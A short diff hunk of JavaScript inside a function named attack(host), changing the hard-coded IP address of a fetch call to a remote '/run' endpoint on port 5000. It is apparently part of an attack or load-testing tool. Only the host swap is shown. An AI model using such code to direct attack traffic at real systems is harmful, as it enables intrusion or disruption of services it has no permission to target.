@@ -53,7 +53,7 @@ async function attack(host){
     };
 
     try {
-        const response = await fetch("http://34.40.59.181:5000/run", requestOptions);
+        const response = await fetch("http://34.124.178.25:5000/run", requestOptions);
         const result = await response.text();
         index++;
         // if (type === 2) {
